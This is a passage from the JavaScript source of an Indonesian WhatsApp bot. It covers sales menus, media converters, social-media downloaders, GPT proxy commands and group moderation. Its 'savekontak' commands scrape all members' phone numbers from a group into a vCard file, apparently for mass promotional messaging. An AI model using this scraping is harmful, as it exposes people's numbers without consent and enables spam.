body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "list_domain": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "list_nokos": {
let teks = `
Belum Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
break
case "list_panel": {
const teks = `*List Harga Panel Run Bot⚡*

*📦 Ram 1GB Cpu 40%*
_Harga : Rp2000_

*📦 Ram 2GB Cpu 50%*
_Harga Rp3000_

*📦 Ram 3GB Cpu 60%*
_Harga : Rp4000_

*📦 Ram 4GB Cpu 80%*
_Harga : Rp5000_

*📦 Ram 5GB Cpu 110*
_Harga Rp6000_

*📦 Ram 6GB Cpu 120%* 
_Harha Rp7000_

*📦 Ram 7GB Cpu 130%* 
_Harga Rp8000_

*📦 Ram 8GB Cpu 150%* 
_Harga Rp9000_

*📦 Ram & Cpu Unlimited* 
_Harga Rp10.000_

*Keuntungan Panel :*
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Bawa Bukti Transaksi!
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "list_scbot": {
let teks = `
Script *Devil 2.3* Di Jual Dengan Harga *Rp30.000*, Jika Berminat Silahkan Klik Tombol Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Script Bot\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtoko}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "remini": case "tohd": case "hd": {
if (/image/g.test(mime)) {
reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await anggazyy.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return reply("Error!")
await anggazyy.sendMessage(m.chat, {image: {url: image.url}, caption: "Berhasil ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => reply(err.toString()))
} else return reply(example('dengan mengirim foto'))
}
break
case "chatgpt": case "gpt": {
if (!text) return reply(example("apa itu nodejs"))
reply(msg.wait)
await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
if (!e.status) return reply(JSON.stringify(e, null, 2))
var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
reply(teks)
})
}
break
case "ai": case "openai": {
if (!text) return reply(example("kamu siapa"))
reply(msg.wait)
await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
if (!e.status) return reply(JSON.stringify(e, null, 2))
var teks = `*© AI - Asistent v4.0.0*\n\n${e.result}`
reply(teks)
})
}
break
case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
anggazyy.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply(example("dengan mengirim/balas vidio"))
}
}
break
case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return reply(example('dengan reply sticker'))
reply(msg.wait)
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
anggazyy.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {
if (!/video|audio/.test(mime) && !/audio/.test(mime)) return reply(example('dengan mengirim audio/vidio'))
reply(msg.wait)
await anggazyy.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
anggazyy.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return reply("Durasi vidio maksimal 30 detik")
reply(msg.wait)
await anggazyy.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
anggazyy.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply(msg.wait)
var media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case "tourl": {
if (!/image/.test(mime)) return reply(example("dengan mengirim foto"))
await reply(msg.wait)
var fotonya = await anggazyy.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await reply(`Link Tautan :\n${urlimage}`)
await fs.unlinkSync(fotonya)
}
break
case "public": {
if (!isOwner) return reply(msg.owner)
anggazyy.public = true
reply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Public*")
}
break
case "self": {
if (!isOwner) return reply(msg.owner)
anggazyy.public = false
reply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Self*")
}
break
case "get": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply("linknya")
try {
var check = await fetchJson(text)
reply(JSON.stringify(check, null, 2))
} catch (e) {
return reply(e.toString())
}}
break
case "setteksjpm": {
if (!isOwner) return reply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./list/teksjpm.js", newteks.toString())
reply("*Teks JPM Berhasil Diganti ✅*")
} else {
return reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {
if (!isOwner) return reply(msg.owner)
reply(fs.readFileSync("./list/teksjpm.js").toString())
}
break
case "instagram": case "igdl": case "ig": {
if (!text) return reply(example("linknya"))
if (!text.includes("instagram.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
anggazyy.sendMedia(m.chat, a.url, m, {
caption: "*Instagram Downloader ✅*"})
}
}).catch(e => reply(e.toString()))
}
break
case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {
if (!text) return reply(example("linknya"))
if (!text.includes("tiktok.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
anggazyy.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => reply(e.toString()))
}
break
case "tiktokslide": case "ttslide": {
if (!text) return reply(example("linknya"))
if (!text.includes("tiktok.com")) return reply("Link tautan tidak valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then(async (data) => {
if (!data.status) return reply(JSON.stringify(data, null, 2))
if (data.result.totalSlide == 0) return reply("Link Tiktok Bukan Slide!")
var cap = `*Tiktok Downloader ✅*`
for (let i of data.result.images) {
anggazyy.sendMessage(m.chat, {image: {url: `${i}`}, caption: cap}, {quoted: m})
}
}).catch(e => reply(e.toString()))
}
break
case "mediafire": {
if (!text) return reply(example("linknya"))
if (!text.includes('mediafire.com')) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return reply(msg.error)
anggazyy.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "*Mediafire Downloader ✅*"}, {quoted: m})
}).catch((e) => reply(e.toString()))
}
break
case "pinterest": case "pin": {
if (!text) return reply(example("tobrut"))
reply(global.msg.wait)
let res = await pinterest(text)
if (res.length == 0) return reply("Error, Foto Tidak Ditemukan")
if (res.length < 5) {
anuan = res
} else {
anuan = res.slice(0,5)
}
let anu = new Array()
for (let ii of anuan) {
let imgsc = await prepareWAMessageMedia({ image: await fetch(`${ii}`)}, { upload: anggazyy.waUploadToServer })
anu.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {                  
                   name: "cta_url",
                   buttonParamsJson:  `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${ii}\",\"merchant_url\":\"https://www.google.com\"}`
                  }
                ]
              })
            })
}

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "🔎 Berikut Adalah Hasil Pencarian Foto Dari *Pinterest*"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: anu
        })
      })
    }
  }
}, {userJid: m.sender, quoted: m})
 
await anggazyy.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "getcase": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./anggazyyo.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* Tidak Ditemukan`)
}
}
break
case "tiktok": case "tt": {
if (!text) return reply(example('linknya'))
if (!/tiktok.com/.test(text)) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `*Tiktok Downloader ✅*`
if (res.result.duration == 0) {
for (let a of res.result.images) {
anggazyy.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await anggazyy.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => reply(`${e}`))
}
break
case "facebook": case "fb": case "fbdl": {
if (!text) return reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return reply("Link Tautan Tidak Valid!")
reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return reply(JSON.stringify(res, null, 2))
anggazyy.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Facebook Downloader ✅*`}, {quoted: m})
}).catch(e => reply(e.toString()))
}
break
case "owner": {
if (!isOwner) return reply('*Oops! Tidak boleh.*')
anggazyy.sendContact(m.chat, [owner], "Telfon/VC = Blokir", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/anggazyy.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case "antilink": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!args[0]) return reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return reply("*Antilink Grup* Di Grup Ini Sudah Aktif!")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("*Berhasil Menyalakan Antilink Grup ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return reply("*Antilink Grup* Di Grup Ini Belum Aktif!")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
reply("*Berhasil Mematikan Antilink Grup ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!args[0]) return reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return reply("*Antilink Grup V2* Di Grup Ini Sudah Aktif!")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("*Berhasil Menyalakan Antilink Grup V2 ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return reply("*Antilink Grup V2* Di Grup Ini Belum Aktif!")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
reply("*Berhasil Mematikan Antilink Grup V2 ✅*\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return reply(example("on/off"))
}}
break
case "welcome": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return reply("*Welcome* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
welcome = true
reply("*Berhasil Menyalakan Welcome ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return reply("*Welcome* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
welcome = false
reply("*Berhasil Mematikan Welcome ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
}}
break
case "autoread": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return reply("*Autoread* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = true
reply("*Berhasil Menyalakan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = false
reply("*Berhasil Mematikan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoreadsw": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (autoreadsw) return reply("*Autoreadsw* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = true
reply("*Berhasil Menyalakan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoreadsw) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = false
reply("*Berhasil Mematikan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "anticall": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return reply("*Anticall* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = true
reply("*Berhasil Menyalakan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return reply("*Anticall* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = false
reply("*Berhasil Mematikan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {
if (!isOwner) return reply(msg.owner)
var teks = `
*List Status Setting Bot :*

* Autoread : ${global.autoread ? "*Aktif*" : "*Tidak Aktif*"}
* Autoreadsw : ${global.autoreadsw ? "*Aktif*" : "*Tidak Aktif*"}
* Anticall : ${global.anticall ? "*Aktif*" : "*Tidak Aktif*"}
* Welcome : ${global.welcome ? "*Aktif*" : "*Tidak Aktif*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
reply(teks)
}
break
case "statusgc": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
var anti1 = "*Aktif*"
var anti2 = "*Aktif*"
if (!antilink2.includes(m.chat)) anti2 = "*Tidak Aktif*"
if (!antilink.includes(m.chat)) anti1 = "*Tidak Aktif*"
var teks = `
*List Status Grup Settings :*

* Antilink : ${anti1}
* AntilinkV2 : ${anti2}

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "setppgc": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (/image/g.test(mime)) {
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Foto Grup ✅*")
} else return reply(example('dengan mengirim foto'))
}
break
case "setnamegc": case "setnamagc": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example('teksnya'))
const gcname = metadata.subject
await anggazyy.groupUpdateSubject(m.chat, text)
reply(`*Berhasil Mengganti Nama Grup ✅*\n*${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example('teksnya'))
await anggazyy.groupUpdateDescription(m.chat, text)
reply(`*Berhasil Mengganti Deskripsi Grup ✅*`)
}
break
case "open": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await anggazyy.groupSettingUpdate(m.chat, 'not_announcement')
reply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await anggazyy.groupSettingUpdate(m.chat, 'announcement')
reply("*Berhasil Mengganti Setelan Grup ✅*\nMenjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {
if (isGroup) {
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!m.quoted) return reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return reply("Reply Pesan Yang Ingin Di Hapus")
anggazyy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => reply(err.toString()))
} else return reply(example('62838XXX'))}
break
case "promote": case "promot": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => reply(err.toString()))
} else return reply(example('6283XXX/@tag'))}
break
case "add": case "addmember": {
if (!isGroup) return reply(msg.group)
if (!args[0]) return reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await anggazyy.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await anggazyy.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => anggazyy.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
anggazyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
anggazyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "savekontak": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Contact Berhasil Di Buat ✅\n*
*Total ${halls.length} Kontak*`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
